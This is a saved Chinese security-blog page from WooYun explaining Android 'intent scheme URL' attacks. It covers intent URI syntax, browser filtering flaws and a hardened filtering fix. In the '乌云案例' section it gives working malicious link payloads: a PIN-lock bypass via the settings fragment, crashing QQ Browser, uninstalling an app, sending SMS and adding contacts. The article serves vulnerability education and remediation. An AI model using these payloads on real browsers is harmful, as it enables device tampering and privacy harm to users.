@@ -1,0 +1,683 @@
+
+<!-- saved from url=(0035)http://drops.wooyun.org/papers/2893 -->
+<html class=" no-touch"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Intent scheme URL attack | WooYun知识库</title>
+  <base href=".">
+  <meta name="fragment" content="!">
+  <meta name="description" content="Intent scheme URL attack">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <style type="text/css"></style>
+  
+  <link rel="stylesheet" href="Intent scheme URL attack _ WooYun知识库_files/95e46879.main.css">
+  <link rel="stylesheet" href="Intent scheme URL attack _ WooYun知识库_files/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="Intent scheme URL attack _ WooYun知识库_files/shCore.css"><link rel="stylesheet" type="text/css" href="Intent scheme URL attack _ WooYun知识库_files/shThemeDefault.css"><style type="text/css" id="syntaxhighlighteranchor"></style>
+
+<style>
+*:focus {
+  outline: none;
+}
+body {
+  margin: 0;
+  /* font-family: Helvetica, Arial, "Hiragino Sans GB", sans-serif; */
+  font-size: 14px;
+  line-height: 20px;
+  color: #555555;
+  background-color: white;
+}
+
+.comment-list{
+  padding-top: 10px;
+  border-top: 1px solid #d9d9d9;
+  margin: 0 auto;
+}
+
+.comment-list .new_comment{
+  margin-bottom: 46px;
+}
+.comment-list .comment-text {
+  padding: 10px;
+  border: 1px solid #d9d9d9;
+  font-family: "lucida grande", "lucida sans unicode", lucida, helvetica, "Hiragino Sans GB", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
+  border-radius: 4px;
+}
+.comment-list textarea {
+  width: 100%;
+  height: 78px;
+  padding: 0;
+  margin: 0;
+  border: none;
+  box-shadow: none;
+  background: transparent;
+  resize: none;
+}
+
+.btn {
+  text-shadow: none;
+  border-radius: 4px;
+  box-shadow: none;
+  color: #555555;
+  border-color: whitesmoke;
+  background: whitesmoke;
+  border-color: #d5d5d5;
+  text-shadow: none;
+  border: 1px solid #cccccc;
+}
+
+.btn-info {
+  color: white;
+  border-color: #15a7f0;
+  background: #15a7f0;
+}
+
+.hotkey {
+  position: relative;
+  top: 2px;
+  margin-left: 11px;
+}
+
+.pull-right {
+  float: right;
+}
+
+.comment-list a {
+  color: #555555;
+  text-decoration: none;
+}
+.comment-list .fa {
+  display: inline-block;
+  font: normal normal normal 14px/1 FontAwesome;
+  font-size: inherit;
+  text-rendering: auto;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  transform: translate(0, 0);
+}
+.comment-list reply:before, .fa-reply:before {
+  content: "\f112";
+}
+
+.comment-list .note-comment {
+  padding: 0 0 10px;
+  margin-bottom: 20px;
+  border-bottom: 1px dashed #d9d9d9;
+}
+
+.comment-list .note-comment .avatar {
+  position: absolute;
+  margin-top: 3px;
+  width: 36px;
+  height: 36px;
+}
+
+.comment-list .note-comment .content {
+  margin-left: 45px;
+}
+.comment-list .note-comment .content .comment-header {
+  margin-bottom: 5px;
+}
+
+.comment-list .note-comment .content .author-name {
+  font-size: 14px;
+  color: #4094c7;
+}
+
+.comment-list .note-comment .content p a {
+  color: #4094c7;
+}
+.comment-list .comment-head{
+  margin-bottom: 10px;
+}
+.comment-list .comment-head input{
+  border-radius:4px;
+  border: 1px solid #cccccc;
+  margin-right: 10px;
+  margin-top: 10px;
+}
+
+.comment-list .comment-head img{
+  margin-bottom: 4px;
+}
+
+.content .author-link {
+   font-weight: 700;
+}
+
+.navbar-wooyun{
+  position: fixed;
+  width: 45px;
+  z-index: 1049;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background: #2f2f2f;
+}
+
+.home-wooyun{
+  font-size: 18px;
+}
+
+.navbar-wooyun div{
+/*  font-size: 26px;*/
+  color: #999999;
+  text-align: center;
+}
+
+.navbar-wooyun a{
+  color: #999999;
+  display: block;
+  padding: 10px;
+  font-size: 16px;
+  line-height: 25px;
+  text-align: center;
+}
+
+.navbar-wooyun a:hover{
+  background-color: #e78170;
+  color: white;
+  text-shadow: 0 1px 0 #de533a;
+}
+
+.home-author-wooyun{
+//  position: absolute;
+  top: 0;
+  width: 100%;
+  padding-top: 5px;
+}
+
+.bottom-author-wooyun{
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  padding-bottom: 5px;
+}
+
+.navbar-title {
+  display: none;
+}
+
+.popover-content {
+  font-weight: 900;
+  width: 60;
+}
+
+.container:before {
+  content: '';
+}
+
+table {
+  border-top: #e0e0e0 1px solid;
+  border-left: #e0e0e0 1px solid;
+  border-collapse: separate;
+  border-spacing: 0;
+}
+
+table th, table td {
+  border-bottom: #e0e0e0 1px solid;
+  border-right: #e0e0e0 1px solid;
+  padding: 0 3px;
+}
+
+.column-about{
+  text-align: center;
+}
+
+@media screen and (max-width: 600px) {
+  .post-view .entry-content hr {
+    margin-left: -17px;
+    margin-right: -17px;
+  }
+
+  .comment-list .new_comment,
+  .comment-list .note-comment {
+    padding-left: 17px;
+    padding-right: 17px;
+  }
+}
+</style>
+</head>
+<body ng-app="columnWebApp" ng-controller="AppCtrl" ng-class="pageClass">
+
+  <div class="navbar-wooyun">
+    <div class="home-author-wooyun">
+      <a href="http://drops.wooyun.org/" data-toggle="popover" data-placement="right" data-content="首页" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-home"></span>
+      </a>
+    </div>
+    <div class="home-author-wooyun">
+      <a href="http://drops.wooyun.org/newsend" data-toggle="popover" data-placement="right" data-content="投稿" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-pencil"></span>
+      </a>
+    </div>
+    <div class="bottom-author-wooyun">
+      <a href="http://drops.wooyun.org/wp-login.php?action=logout&amp;redirect_to=http%3A%2F%2Fdrops.wooyun.org" data-toggle="popover" data-placement="right" data-content="登出" data-trigger="hover" data-original-title="" title="">
+        <span class="glyphicon glyphicon-log-out"></span>
+      </a>
+    </div>
+  </div>
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">Intent scheme URL attack</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" href="http://drops.wooyun.org/author/%E7%98%A6%E8%9B%9F%E8%88%9E" class="author name ng-binding">
+          瘦蛟舞</a>
+        <span class="bull">·</span>
+        <time title="2014/08/29 12:19" ui-time="" datetime="2014/08/29 12:19" class="published ng-binding ng-isolate-scope">2014/08/29 12:19</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h2>0x01 Android Intents with Chrome</h2>
+
+<hr>
+
+<p>Android有一个很少人知道的特性可以通过web页面发送intent来启动apps。以前通过网页启动app是通过设置iframe的src属性，例如：</p>
+
+<pre class="highlight">&lt;iframe src="paulsawesomeapp://page1"&gt; &lt;/iframe&gt;
+</pre>
+
+<p>此方法适用version 18或者更早版本。其他android浏览器也适用。 这个功能在安卓chrome 浏览器version 25之后版本发生了改变。不能在通过设置iframe标签的src属性来启动app了。取而代之的是你应该通过自定义scheme实现用户手势启动app或者使用本文描述的“intent:”语法。</p>
+
+<p><strong>1.1 基本语法</strong></p>
+
+<p>“最佳实践”是构造一个intent插入网页中使用户能够登录app。这为您提供了更多的灵活性在控制应用程序是如何启动，包括传通过<a href="http://developer.android.com/guide/components/intents-filters.html#extras">Intent Extras</a>传递额外信息。 intent-based URI基本语法如下：</p>
+
+<pre class="highlight">intent:
+   HOST/URI-path // Optional host
+   #Intent;
+      package=[string];
+      action=[string];
+      category=[string];
+      component=[string];
+      scheme=[string];
+   end;
+</pre>
+
+<!--more-->
+
+<p>语法细节见源码<a href="https://code.google.com/p/android-source-browsing/source/browse/core/java/android/content/Intent.java?repo=platform--frameworks--base#6514">Android source</a></p>
+
+<p><img src="Intent scheme URL attack _ WooYun知识库_files/2014082804323473396.png" alt="enter image description here"></p>
+
+<p><img src="Intent scheme URL attack _ WooYun知识库_files/2014082804323498800.png" alt="enter image description here"></p>
+
+<p><strong>1.2 简单举例</strong></p>
+
+<p>例子是一个intent登陆应用“Zxing barcode scanner”，语法如下：</p>
+
+<pre class="highlight">intent:
+   //scan/
+   #Intent;
+      package=com.google.zxing.client.android;
+      scheme=zxing;
+   end;
+</pre>
+
+<p>设置a标签发href属性：</p>
+
+<pre class="highlight">&lt;a href="intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end"&gt; Take a QR code &lt;/a&gt;
+</pre>
+
+<p>Package和host定义在配置文件中<a href="https://code.google.com/p/zxing/source/browse/trunk/android/AndroidManifest.xml#97">Android Zxing Manifest</a></p>
+
+<p><strong>1.3 注意事项</strong></p>
+
+<p>如果调用activity的intent包含<a href="http://developer.android.com/guide/components/intents-filters.html#extras">extras</a>，同样可以包含这些。 Activity只有配置了category filter才有被<a href="http://developer.android.com/reference/android/content/Intent.html#CATEGORY_BROWSABLE">android.intent.category.BROWSABLE</a>通过这种方式在浏览器中打开，因为这样表明其是安全的。</p>
+
+<p><strong>1.4 另请参阅</strong></p>
+
+<p>• <a href="http://developer.android.com/guide/components/intents-filters.html">Android Intents and Intent Filters</a></p>
+
+<p>• <a href="http://developer.android.com/guide/components/activities.html">Android Activities</a></p>
+
+<h2>0x02 利用思路</h2>
+
+<hr>
+
+<p>在Android上的Intent-based攻击很普遍，这种攻击轻则导致应用程序崩溃，重则可能演变提权漏洞。当然，通过静态特征匹配，Intent-Based的恶意样本还是很容易被识别出来的。 然而最近出现了一种基于Android Browser的攻击手段——Intent Scheme URLs攻击。这种攻击方式利用了浏览器保护措施的不足，通过浏览器作为桥梁间接实现Intend-Based攻击。相比于普通Intend-Based攻击，这种方式极具隐蔽性，而且由于恶意代码隐藏WebPage中，传统的特征匹配完全不起作用。除此之外，这种攻击还能直接访问跟浏览器自身的组件（无论是公开还是私有）和私有文件，比如cookie文件，进而导致用户机密信息的泄露。</p>
+
+<h2>0x03 1.3 Intent scheme URL的用法</h2>
+
+<p>看一下Intent Scheme URL的用法。</p>
+
+<pre class="highlight">&lt;script&gt;location.href = "intent:mydata#Intent;action=myaction;type=text/plain;end"&lt;/script&gt;  
+</pre>
+
+<p>从用法上看，还是很好理解的，这里的代码等价于如下Java代码：</p>
+
+<pre class="highlight">Intent intent = new Intent("myaction");  
+intent.setData(Uri.parse("mydata"));  
+intent.setType("text/plain");  
+</pre>
+
+<p>再看一个例子：</p>
+
+<pre class="highlight">intent://foobar/#Intent;action=myaction;type=text/plain;S.xyz=123;i.abc=678;end 
+</pre>
+
+<p>上面的语句，等价于如下Java代码：</p>
+
+<pre class="highlight">Intent intent = new Intent("myaction");  
+intent.setData(Uri.pase("//foobar/"));  
+intent.putExtra("xyz", "123");  
+intent.putExtra("abc", 678);  
+</pre>
+
+<p>其中S代表String类型的key-value，i代表int类型的key-value。 源码中提供了Intent.parseUri(String uri)静态方法，通过这个方法可以直接解析uri，如果想更一步了解其中的语法，可以查看官方源码。</p>
+
+<h2>0x04 Intent scheme URI的解析及过滤</h2>
+
+<hr>
+
+<p>如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理：</p>
+
+<blockquote>
+  <ol>
+  <li>利用Intent.parseUri解析uri，获取原始的intent对象； </li>
+  <li>对intent对象设置过滤规则，不同的浏览器有不同的策略，后面会详细介绍； </li>
+  <li>通过Context.startActivityIfNeeded或者Context.startActivity发送intent； 其中步骤2起关键作用，过滤规则缺失或者存在缺陷都会导致Intent Schem URL攻击。</li>
+  </ol>
+</blockquote>
+
+<p>关键函数</p>
+
+<pre class="highlight">Intent.parseUri()
+</pre>
+
+<p>绕过</p>
+
+<pre class="highlight">Intent.setComponent(null);
+</pre>
+
+<p>使用sel;</p>
+
+<h2>0x05 乌云案例</h2>
+
+<hr>
+
+<p> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-073875">WooYun: qq浏览器IntentScheme处理不当</a> </p>
+
+<p> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-067798">WooYun: 傲游云浏览器远程隐私泄露漏洞（需要一定条件）</a> </p>
+
+<p>某浏览器对此支持非常好</p>
+
+<pre class="highlight">&lt;a href="intent:#Intent;action=android.settings.SETTINGS;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;end"&gt;
+   设置绕过Pin码（android 3.0-4.3）
+&lt;/a&gt;
+</pre>
+
+<p><img src="Intent scheme URL attack _ WooYun知识库_files/2014082804323426472.png" alt="enter image description here"></p>
+
+<pre class="highlight">&lt;a href="intent:#Intent;component=com.tencent.mtt/com.tencent.mtt.debug.DbgMemWatch;end"&gt;
+    qq浏览器崩溃
+&lt;/a&gt;
+</pre>
+
+<p><img src="Intent scheme URL attack _ WooYun知识库_files/2014082904195693450.png" alt="enter image description here"></p>
+
+<pre class="highlight">&lt;a href="intent:http://drops.wooyun.org/webview.html#Intent;component=com.android.browser/com.android.browser.BrowserActivity;end"&gt;
+    打开原生浏览器
+&lt;/a&gt;
+</pre>
+
+<p><img src="Intent scheme URL attack _ WooYun知识库_files/2014082904195948004.png" alt="enter image description here"></p>
+
+<hr>
+
+<pre class="highlight">&lt;a href="intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end"&gt;
+   发送短信
+&lt;/a&gt;&lt;br&gt;
+</pre>
+
+<hr>
+
+<pre class="highlight">&lt;a href="intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end"&gt;
+   打开相机
+&lt;/a&gt;&lt;br&gt;
+</pre>
+
+<hr>
+
+<pre class="highlight">&lt;a href="intent:package:org.wooyun.hiwooyun#Intent;action=android.intent.action.DELETE;end"&gt;
+   删除应用
+&lt;/a&gt;&lt;br&gt;
+</pre>
+
+<hr>
+
+<pre class="highlight">&lt;a href="intent:#Intent;action=android.intent.action.INSERT_OR_EDIT;S.name=magic;S.phone=+8610000;i.phone_type=2;type=vnd.android.cursor.item/person;end"&gt;
+    添加联系人
+&lt;/a&gt;&lt;br&gt;
+</pre>
+
+<h2>0x06 修复</h2>
+
+<hr>
+
+<p>通过以上漏洞的描述，总结得出一种相对比较安全的Intent Filter方法，代码如下：</p>
+
+<pre class="highlight">// convert intent scheme URL to intent object  
+Intent intent = Intent.parseUri(uri);  
+// forbid launching activities without BROWSABLE category  
+intent.addCategory("android.intent.category.BROWSABLE");  
+// forbid explicit call  
+intent.setComponent(null);  
+// forbid intent with selector intent  
+intent.setSelector(null);  
+// start the activity by the intent  
+context.startActivityIfNeeded(intent, -1);  
+</pre>
+
+<h2>0x07 参考</h2>
+
+<hr>
+
+<p><a href="http://www.mbsd.jp/Whitepaper/IntentScheme.pdf">http://www.mbsd.jp/Whitepaper/IntentScheme.pdf</a></p>
+
+<p><a href="http://blog.csdn.net/l173864930/article/details/36951805">http://blog.csdn.net/l173864930/article/details/36951805</a></p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+        <div class="right-section">
+          <!-- <span class="control-item read-counts">
+            <i class="icon icon-eye"></i>13 人读过
+          </span> -->
+          <!-- ngIf: ownPost(post) -->
+          <a href="javascript:void(0)" name="colloct-button" class="control-item report ng-scope fav-add">
+            <i class="glyphicon glyphicon-star-empty"></i><span>收藏</span>
+          </a><!-- end ngIf: !ownPost(post) && !isCensoring -->
+          <!-- ngIf: !isCensoring --><div ng-transclude="" class="post-share-button post-menu-button ui-menu-button ng-scope" ng-class="{ true: 'open', false: 'close' }[open]" ui-menu-button="" onbeforeopen="beforeShareMenuOpen()" ng-if="!isCensoring">
+            <a href="javascript:void(0)" class="menu-button control-item share ng-scope"><i class="icon icon-share"></i>分享</a>
+            <menu class="menu ng-scope" tabindex="0">
+              <!-- ngRepeat: item in shareMenuItems --><div class="menu-item ng-binding ng-scope share-weibo" tabindex="0">
+              <a class="share-sina-weibo" target="_blank" href="http://service.weibo.com/share/share.php?title=%20Intent%20scheme%20URL%20attack%EF%BC%88%E5%88%86%E4%BA%AB%E6%9D%A5%E8%87%AA%20@%E4%B9%8C%E4%BA%91%E7%9F%A5%E8%AF%86%E5%BA%93%20%C2%B7%20%E4%BD%9C%E8%80%85%EF%BC%9A%E7%98%A6%E8%9B%9F%E8%88%9E%EF%BC%89&amp;url=http%3A//drops.wooyun.org/papers/2893&amp;pic=http://static.wooyun.org/20140828/2014082804323473396.png">
+                <i class="icon icon-share-sina"></i>新浪微博
+              </a>
+              </div><!-- end ngRepeat: item in shareMenuItems -->
+            </menu>
+          </div><!-- end ngIf: !isCensoring -->
+
+        </div>
+
+      </div>
+
+          <div id="donate" style="padding: 10px;border-top: 1px solid #d9d9d9;text-align: center;"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="Intent scheme URL attack _ WooYun知识库_files/20141223141529d33ebc5e18e728db5f4a24d40002e9d1.jpg" style="width:200px; height:200px"></div>
+  <!-- collect end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            <div class="new_comment" data-remote="true" id="new_comment">
+              <div class="comment-head">
+              <input type="hidden" name="comment_post_ID" value="2893">
+                            <input type="input" placeholder="昵称" name="nickname"><br>
+                          <input type="input" placeholder="验证码" name="captcha"> <img id="captcha_img" align="center" src="Intent scheme URL attack _ WooYun知识库_files/captcha.php" style="border:none; cursor:pointer" onclick="this.src='/wooyun/captcha.php?'+Math.random()"><br>
+            </div>
+      <div class="comment-text">
+        <textarea class="mousetrap" id="comment_content" maxlength="2000" placeholder="写下你的评论…"></textarea>
+        <div>
+          <input class="btn btn-info" data-disable-with="提交中..." name="commit" type="submit" value="发 表">
+          <span class="warning" style="display: none"><i class="fa fa-exclamation-circle"></i><span class="warning-text"></span></span>
+        </div>
+      </div>
+  </div>
+          <div id="comment-list">
+        <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/avatar_478.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">瘦蛟舞</span>
+          <span class="reply-time">2015-03-16 14:37:06</span>
+        </div>
+        <p>0x07 参考
+不是标注了参考么......</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;瘦蛟舞&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">jiayaoqijia</span>
+          <span class="reply-time">2014-09-24 21:07:37</span>
+        </div>
+        <p>具体的参加这个link吧。http://www.mbsd.jp/Whitepaper/IntentScheme.pdf</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;jiayaoqijia&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/avatar_4953.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">进击的zjx</span>
+          <span class="reply-time">2014-09-09 17:46:05</span>
+        </div>
+        <p>瘦瘦牛！我来学习啦</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;进击的zjx&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">hqdvista</span>
+          <span class="reply-time">2014-08-30 09:36:48</span>
+        </div>
+        <p>总算流传开了，语法不支持parcelable是一大遗憾</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;hqdvista&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/avatar_1006.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">winsyk</span>
+          <span class="reply-time">2014-08-29 23:41:35</span>
+        </div>
+        <p>mark。</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;winsyk&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/avatar_752.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">zzR</span>
+          <span class="reply-time">2014-08-29 15:50:53</span>
+        </div>
+        <p>MK ，学习 ，乃们都是大牛牛</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;zzR&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      <div class="note-comment">
+      <img class="avatar" alt="30" src="Intent scheme URL attack _ WooYun知识库_files/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Comver</span>
+          <span class="reply-time">2014-08-29 14:01:03</span>
+        </div>
+        <p>消灭0留言</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick="reply(&quot;Comver&quot;)" href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    </div>
+  </div>
+  <!-- comment end -->
+  <aside class="sidebar">
+    <div class="block column-about">
+      <a href="http://drops.wooyun.org/author/%E7%98%A6%E8%9B%9F%E8%88%9E" class="avatar-link">
+        <img class="avatar-big" ng-src="http://zone.wooyun.org/upload/avatar/avatar_478_b.jpg" src="Intent scheme URL attack _ WooYun知识库_files/avatar_478_b.jpg">
+      </a>
+      <a href="http://drops.wooyun.org/author/%E7%98%A6%E8%9B%9F%E8%88%9E" class="title ng-binding">瘦蛟舞</a>
+      <!-- ngIf: column.creator.slug == me.slug -->
+      <div class="followers" ng-switch="" on="!!column.followersCount">
+
+      </div>
+      <div class="description ng-binding" ng-bind-html="column.description | linky"></div>
+    </div>
+
+    <div class="block rel-topics ng-hide" ng-show="!isCensoring &amp;&amp; (post.topics.length || ownPost(post))">
+      <!-- ngIf: post.topics.length -->
+      <!-- ngIf: ownPost(post) -->
+    </div>
+
+  </aside>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" id="wp-easyarchives-css" href="Intent scheme URL attack _ WooYun知识库_files/wp-easyarchives.css" type="text/css" media="screen">
+<link rel="stylesheet" id="wp-recentcomments-css" href="Intent scheme URL attack _ WooYun知识库_files/wp-recentcomments.css" type="text/css" media="screen">
+
+
+<span style="float: right;">感谢知乎授权页面模版</span>
+<!-- 百度统计-->
+<div style="display:none">
+<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img border="0" src="Intent scheme URL attack _ WooYun知识库_files/21.gif" width="20" height="20"></a>
+</div>
+
+
+
+
+</main></body></html>
